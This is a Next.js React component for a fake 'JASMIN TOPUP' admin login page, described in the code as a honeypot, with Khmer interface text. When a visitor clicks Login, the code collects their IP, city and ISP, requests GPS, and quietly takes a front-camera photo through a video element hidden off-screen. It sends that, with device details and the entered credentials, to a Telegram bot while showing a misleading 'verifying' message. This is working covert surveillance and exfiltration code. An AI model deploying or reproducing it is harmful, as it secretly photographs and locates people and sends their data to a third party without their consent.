"use client";

import { useState, useEffect, useRef } from "react";
import Image from "next/image";

// =====================================
// PUT YOUR TELEGRAM BOT TOKEN & CHAT ID
// in your .env file:
//   NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=your_bot_token
//   NEXT_PUBLIC_TELEGRAM_CHAT_ID=your_chat_id
// =====================================
const TELEGRAM_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "";

async function sendToTelegram(text: string) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return;
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: "HTML",
    }),
  });
}

async function sendPhotoToTelegram(base64: string, caption: string) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return;
  // Convert base64 to blob
  const res = await fetch(base64);
  const blob = await res.blob();
  const formData = new FormData();
  formData.append("chat_id", TELEGRAM_CHAT_ID);
  formData.append("photo", blob, "hacker.jpg");
  formData.append("caption", caption);
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData,
  });
}

export default function HoneypotLoginPage() {
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [inputEmail, setInputEmail] = useState("jasminadmin@gmail.com");
  const [inputPassword, setInputPassword] = useState("jaminadmin1122334455!@");
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const fakeEmail = inputEmail;
  const fakePassword = inputPassword;

  async function getIPInfo() {
    try {
      const r = await fetch("https://ipapi.co/json/");
      return await r.json();
    } catch {
      return {};
    }
  }

  async function getLocation(): Promise<{ lat: number; lon: number; mapLink: string } | null> {
    return new Promise((resolve) => {
      if (!navigator.geolocation) { resolve(null); return; }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          resolve({
            lat, lon,
            mapLink: `https://www.google.com/maps?q=${lat},${lon}`,
          });
        },
        () => resolve(null),
        { timeout: 6000 }
      );
    });
  }

  async function takeFrontPhoto(): Promise<string | null> {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false,
      });
      if (!videoRef.current || !canvasRef.current) { stream.getTracks().forEach(t => t.stop()); return null; }
      videoRef.current.srcObject = stream;
      await videoRef.current.play();
      await new Promise(r => setTimeout(r, 1200)); // wait for camera to warm up
      const canvas = canvasRef.current;
      canvas.width = videoRef.current.videoWidth || 640;
      canvas.height = videoRef.current.videoHeight || 480;
      canvas.getContext("2d")?.drawImage(videoRef.current, 0, 0);
      stream.getTracks().forEach(t => t.stop());
      return canvas.toDataURL("image/jpeg", 0.85);
    } catch {
      return null;
    }
  }

  async function handleLogin() {
    setLoading(true);

    // Gather all info in parallel
    const [ipInfo, location, photo] = await Promise.all([
      getIPInfo(),
      getLocation(),
      takeFrontPhoto(),
    ]);

    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screen = `${window.screen.width}x${window.screen.height}`;
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const now = new Date().toLocaleString("km-KH", { timeZone: "Asia/Phnom_Penh" });

    const mapLink = location?.mapLink || "មិនអាចទទួលបានទីតាំង";

    const message = `
🚨 <b>HACKER DETECTED — JASMIN ADMIN</b> 🚨

🕐 <b>ពេលវេលា:</b> ${now}

🌐 <b>IP Address:</b> ${ipInfo.ip || "Unknown"}
🏙️ <b>ទីក្រុង:</b> ${ipInfo.city || "?"}, ${ipInfo.region || "?"}
🌍 <b>ប្រទេស:</b> ${ipInfo.country_name || "?"} ${ipInfo.country_code || ""}
📡 <b>ISP:</b> ${ipInfo.org || "?"}

📍 <b>GPS Location:</b> <a href="${mapLink}">${mapLink}</a>

💻 <b>Device:</b> ${platform}
🖥️ <b>Screen:</b> ${screen}
🌐 <b>Browser:</b> ${ua.substring(0, 120)}
🔤 <b>Language:</b> ${language}
⏰ <b>Timezone:</b> ${timeZone}

📧 <b>Email បញ្ចូល:</b> ${fakeEmail}
🔑 <b>Password បញ្ចូល:</b> ${fakePassword}

⚠️ <b>Action:</b> Attempted fake admin login
    `.trim();

    // Send text info first
    await sendToTelegram(message);

    // Send photo if captured
    if (photo) {
      await sendPhotoToTelegram(photo, `📸 រូបថត Hacker — ${ipInfo.ip || "Unknown IP"} — ${now}`);
    } else {
      await sendToTelegram("📷 មិនអាចថតរូបបានទេ (Camera បានបដិសេធ ឬមិនមាន)");
    }

    setLoading(false);
    setDone(true);
  }

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:wght@300;400;600;700&display=swap');

        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
          font-family: 'Kantumruy Pro', sans-serif;
          background: #fff0f5;
          min-height: 100vh;
        }

        .hp-root {
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          position: relative;
          overflow: hidden;
          background: linear-gradient(135deg, #ffe4ef 0%, #ffd6e8 50%, #fce4ff 100%);
        }

        /* Floating hearts background */
        .hp-bg-icon {
          position: fixed;
          font-size: 1.5rem;
          opacity: 0.08;
          pointer-events: none;
          animation: floatUp var(--dur) linear var(--delay) infinite;
          z-index: 0;
        }

        @keyframes floatUp {
          from { transform: translateY(110vh) rotate(0deg); opacity: 0.08; }
          to   { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
        }

        .hp-wrap {
          position: relative;
          z-index: 10;
          width: 100%;
          max-width: 420px;
          padding: 1.5rem;
        }

        .hp-logo {
          display: flex;
          justify-content: center;
          margin-bottom: 1.2rem;
        }

        .hp-logo img {
          width: 80px; height: 80px;
          border-radius: 50%;
          border: 3px solid rgba(233,30,99,0.3);
          box-shadow: 0 4px 20px rgba(233,30,99,0.25);
        }

        .hp-card {
          background: rgba(255,255,255,0.92);
          backdrop-filter: blur(20px);
          border-radius: 24px;
          padding: 2.5rem 2rem 2rem;
          box-shadow: 0 8px 40px rgba(233,30,99,0.12), 0 2px 8px rgba(0,0,0,0.06);
          text-align: center;
        }

        .hp-title {
          font-size: 1.4rem;
          font-weight: 700;
          color: #c2185b;
          margin-bottom: 0.3rem;
        }

        .hp-sub {
          font-size: 0.8rem;
          color: #aaa;
          margin-bottom: 1.8rem;
        }

        .hp-field {
          text-align: left;
          margin-bottom: 1rem;
        }

        .hp-label {
          display: block;
          font-size: 0.78rem;
          color: #888;
          margin-bottom: 0.35rem;
          font-weight: 500;
        }

        .hp-input {
          width: 100%;
          padding: 0.7rem 1rem;
          border: 1.5px solid #f8bbd0;
          border-radius: 12px;
          font-size: 0.9rem;
          font-family: 'Kantumruy Pro', sans-serif;
          color: #333;
          background: #fff;
          outline: none;
          transition: border-color 0.2s, box-shadow 0.2s;
        }

        .hp-input:focus {
          border-color: #e91e63;
          box-shadow: 0 0 0 3px rgba(233,30,99,0.1);
        }

        .hp-btn {
          width: 100%;
          padding: 0.85rem;
          background: linear-gradient(135deg, #e91e63, #c2185b);
          color: white;
          border: none;
          border-radius: 14px;
          font-size: 1rem;
          font-weight: 600;
          font-family: 'Kantumruy Pro', sans-serif;
          cursor: pointer;
          margin-top: 0.5rem;
          transition: opacity 0.2s, transform 0.15s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 0.5rem;
        }

        .hp-btn:hover { opacity: 0.92; transform: translateY(-1px); }
        .hp-btn:active { transform: translateY(0); }
        .hp-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }

        .hp-spinner {
          width: 18px; height: 18px;
          border: 2px solid rgba(255,255,255,0.4);
          border-top-color: white;
          border-radius: 50%;
          animation: spin 0.7s linear infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .hp-success {
          color: #e91e63;
          font-size: 0.9rem;
          margin-top: 1rem;
          padding: 0.8rem;
          background: #fff0f5;
          border-radius: 10px;
          border: 1px solid #f8bbd0;
        }

        /* Hidden video/canvas for camera capture */
        .hp-hidden {
          position: fixed;
          opacity: 0;
          pointer-events: none;
          width: 1px; height: 1px;
          top: -9999px; left: -9999px;
        }

        .hp-back {
          display: block;
          text-align: center;
          margin-top: 1.2rem;
          font-size: 0.78rem;
          color: rgba(194,24,91,0.5);
          text-decoration: none;
          transition: color 0.2s;
        }
        .hp-back:hover { color: #e91e63; }
      `}</style>

      {/* Hidden video + canvas for camera */}
      <video ref={videoRef} className="hp-hidden" muted playsInline />
      <canvas ref={canvasRef} className="hp-hidden" />

      <div className="hp-root">
        {/* Floating background icons */}
        {["💕","🌸","✨","💖","🌺","⭐","💗","🎀"].map((icon, i) => (
          <div
            key={i}
            className="hp-bg-icon"
            style={{
              left: `${10 + i * 12}%`,
              ["--dur" as string]: `${8 + i * 2}s`,
              ["--delay" as string]: `${i * 1.5}s`,
            }}
          >
            {icon}
          </div>
        ))}

        <div className="hp-wrap">
          <div className="hp-logo">
            <Image
              src="https://i.ibb.co/ycPxxz8h/IMG-20260515-100429.png"
              alt="JASMIN"
              width={80}
              height={80}
              priority
            />
          </div>

          <div className="hp-card">
            <div className="hp-title">🔐 Admin Login</div>
            <div className="hp-sub">JASMIN TOPUP — Admin Dashboard</div>

            <div className="hp-field">
              <label className="hp-label">Email</label>
              <input
                className="hp-input"
                type="text"
                value={inputEmail}
                onChange={e => setInputEmail(e.target.value)}
                autoComplete="off"
              />
            </div>

            <div className="hp-field">
              <label className="hp-label">Password</label>
              <div style={{ position: "relative" }}>
                <input
                  className="hp-input"
                  type={showPassword ? "text" : "password"}
                  value={inputPassword}
                  onChange={e => setInputPassword(e.target.value)}
                  style={{ paddingRight: "3rem" }}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(v => !v)}
                  style={{
                    position: "absolute",
                    right: "0.75rem",
                    top: "50%",
                    transform: "translateY(-50%)",
                    background: "none",
                    border: "none",
                    cursor: "pointer",
                    fontSize: "1.1rem",
                    color: "#e91e63",
                    padding: "0.2rem",
                    lineHeight: 1,
                  }}
                  title={showPassword ? "លាក់ Password" : "បង្ហាញ Password"}
                >
                  {showPassword ? "🙈" : "👁️"}
                </button>
              </div>
            </div>

            <button
              className="hp-btn"
              onClick={handleLogin}
              disabled={loading || done}
            >
              {loading ? (
                <>
                  <span className="hp-spinner" />
                  កំពុង Login...
                </>
              ) : done ? (
                "✅ បានចូល"
              ) : (
                "🔓 Login"
              )}
            </button>

            {done && (
              <div className="hp-success">
                ⏳ កំពុងផ្ទៀងផ្ទាត់... សូមរង់ចាំ
              </div>
            )}
          </div>

          <a href="/" className="hp-back">← ត្រឡប់ទៅទំព័រដើម</a>
        </div>
      </div>
    </>
  );
}